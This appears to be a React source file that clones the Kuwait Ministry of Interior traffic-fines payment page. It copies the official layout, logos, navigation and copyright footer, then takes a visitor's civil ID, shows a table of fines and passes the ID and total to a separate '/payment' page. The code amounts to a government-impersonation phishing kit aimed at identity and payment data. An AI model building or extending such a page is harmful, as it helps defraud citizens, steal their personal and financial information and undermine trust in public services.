import { useState, useEffect } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { trpc } from "@/lib/trpc";
import { useToast } from "@/hooks/use-toast";
import { useLocation } from "wouter";

export default function Home() {
  const { lang } = useLanguage();
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [results, setResults] = useState<any>(null);
  const [isSearching, setIsSearching] = useState(false);

  const queryMutation = trpc.fines.query.useMutation({
    onSuccess: (data) => {
      setIsSearching(false);
      if (data.success) {
        setResults(data);
        renderResults(data);
      } else {
        toast({ variant: "destructive", title: "خطأ", description: data.errorMessage || "فشل الاستعلام" });
      }
    },
    onError: (err) => {
        setIsSearching(false);
        toast({ variant: "destructive", title: "خطأ", description: err.message });
    }
  });

  const renderResults = (data: any) => {
    const container = document.getElementById('responseInfo');
    if (!container) return;
    
    let htmlContent = `<div class="mt-4" dir="rtl" style="text-align:right">
      <div class="d-flex justify-content-between mb-3 border-bottom pb-2">
        <span class="font-weight-bold">عدد المخالفات: ${data.fines.length}</span>
        <span class="font-weight-bold text-danger">الإجمالي: ${data.totalAmount} د.ك</span>
      </div>
      <div class="table-responsive">
        <table class="table table-bordered table-sm bg-white">
          <thead class="thead-light">
            <tr>
              <th class="text-center">إختر</th>
              <th>رقم المخالفة</th>
              <th>التاريخ</th>
              <th>القيمة</th>
            </tr>
          </thead>
          <tbody>`;
          
    data.fines.forEach((fine: any) => {
      htmlContent += `<tr>
        <td class="text-center"><input type="checkbox" checked disabled /></td>
        <td>${fine.ticketNo}</td>
        <td>${fine.dateTime}</td>
        <td class="font-weight-bold">${fine.amount}</td>
      </tr>`;
    });
    
    htmlContent += `</tbody></table></div>
    <div class="text-center mt-3">
      <button id="customPayBtn" class="btn btn-primary" style="background:#000576; width:200px; border:none; padding:10px; color:white; font-weight:bold; cursor:pointer">دفع</button>
    </div></div>`;
    
    container.innerHTML = htmlContent;
    const btn = document.getElementById('customPayBtn');
    if (btn) {
        btn.onclick = () => {
            sessionStorage.setItem("paymentData", JSON.stringify({
                selectedFines: data.fines,
                totalAmount: data.totalAmount,
                civilId: (document.getElementById('civilId') as HTMLInputElement).value
            }));
            setLocation("/payment");
        };
    }
  };

  useEffect(() => {
    const form = document.getElementById('enquireForm');
    if (form) {
      form.onsubmit = (e) => {
        e.preventDefault();
        const cidInput = document.getElementById('civilId') as HTMLInputElement;
        const typeSelect = document.getElementById('enquiryType') as HTMLSelectElement;
        if (!cidInput || cidInput.value.length < 8) {
            toast({ variant: "destructive", description: "يرجى إدخال الرقم المدني بشكل صحيح" });
            return;
        }
        setIsSearching(true);
        queryMutation.mutate({ civilId: cidInput.value, enquiryType: typeSelect.value as "1" | "2", lang: "ar" });
      };
    }
  }, []);

  // Using the exact structure from MOI website
  const rawHtml = `
<div class="container">
<header>
<div class="row">
<div class="col-4 col-md-2 col-lg-2 text-center">
<a class="navbar-brand m-0" href="https://www.moi.gov.kw/main/">
<img src="https://www.moi.gov.kw/main/images/assets/common/logo-moi.svg" style="height: 120px;"/>
</a>
</div>
<div class="col-8 col-md-10 align-self-center text-right">
<div class="row justify-content-end">
<div class="col-auto">
<img src="https://www.moi.gov.kw/main/images/assets/common/ar/state-of-kuwait.svg" style="height:30px; display:block; margin-bottom:5px"/>
<img src="https://www.moi.gov.kw/main/images/assets/common/ar/ministry-of-interior.svg" style="height:30px"/>
</div>
</div>
</div>
</div>
<nav class="navbar navbar-expand-lg navbar-dark" style="background:#000576; margin-top:10px">
<div class="container">
<div class="collapse navbar-collapse show">
<ul class="navbar-nav pr-0" style="flex-direction:row-reverse">
<li class="nav-item active"><a class="nav-link text-white px-3" href="#">الخدمات الإلكترونيـة</a></li>
<li class="nav-item"><a class="nav-link text-white px-3" href="#">الرئيسيــة</a></li>
</ul>
</div>
</div>
</nav>
</header>

<div class="row no-gutters mt-4">
<div class="col-lg-4 order-lg-2" style="background:#000576; min-height:400px; padding:20px">
<div class="list-group">
<a href="#" class="list-group-item list-group-item-action active" style="background:#fff; color:#000576; border:none; margin-bottom:10px">دفع المخالفات</a>
<a href="#" class="list-group-item list-group-item-action text-white" style="background:transparent; border:none">الخدمات الالكترونية لرخص السوق</a>
<a href="#" class="list-group-item list-group-item-action text-white" style="background:transparent; border:none">نظام مواعيد اختبار القيادة</a>
</div>
</div>

<div class="col-lg-8 order-lg-1" style="padding:20px; background:#fff">
<div class="text-center mb-4">
<h4 style="color:#000576; font-weight:bold">الإدارة العامة للمرور</h4>
<img src="https://www.moi.gov.kw/main/images/assets/common/ico-horizontal-bar.svg" style="width:100%; max-width:300px"/>
</div>

<form id="enquireForm" class="p-4 border rounded shadow-sm">
<div class="form-group text-right">
<label style="color:#000576; font-weight:bold">Enquiry Type</label>
<select id="enquiryType" class="form-control">
<option value="1">الأفراد</option>
<option value="2">الشركات</option>
</select>
</div>
<div class="form-group text-right mt-3">
<label style="color:#000576; font-weight:bold">الرقم المدني أو الرقم الموحد</label>
<input id="civilId" type="text" class="form-control" placeholder="أدخل الرقم المدني"/>
</div>
<div class="text-center mt-4">
<button id="btnEnquire" type="submit" class="btn text-white" style="background:#000576; width:200px; font-weight:bold">إستعلم</button>
</div>
</form>

<div id="responseInfo" class="mt-4"></div>
</div>
</div>
<footer class="mt-5 py-4 text-center border-top">
<p class="text-muted">© جميع الحقوق محفوظة لوزارة الداخلية - دولة الكويت 2026</p>
</footer>
</div>
  `;

  return (
    <div className="moi-clone-container" dir="rtl">
      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" />
      <style>{`
        body { background-color: #e9e6de !important; font-family: 'Cairo', sans-serif; }
        .moi-clone-container { background-color: #e9e6de; min-height: 100vh; padding-bottom: 50px; }
        .container { background-color: transparent; }
        .navbar-nav { width: 100%; }
        .list-group-item:hover { background: rgba(255,255,255,0.1); color: #fff; }
        @media (max-width: 991px) {
            .col-lg-4 { order: 1 !important; }
            .col-lg-8 { order: 2 !important; }
        }
      `}</style>
      <div dangerouslySetInnerHTML={{ __html: rawHtml }} />
      {isSearching && (
        <div style={{position:'fixed', top:0, left:0, right:0, bottom:0, background:'rgba(0,0,0,0.5)', display:'flex', justifyContent:'center', alignItems:'center', zIndex:9999}}>
            <div className="spinner-border text-white" role="status"></div>
        </div>
      )}
    </div>
  );
}
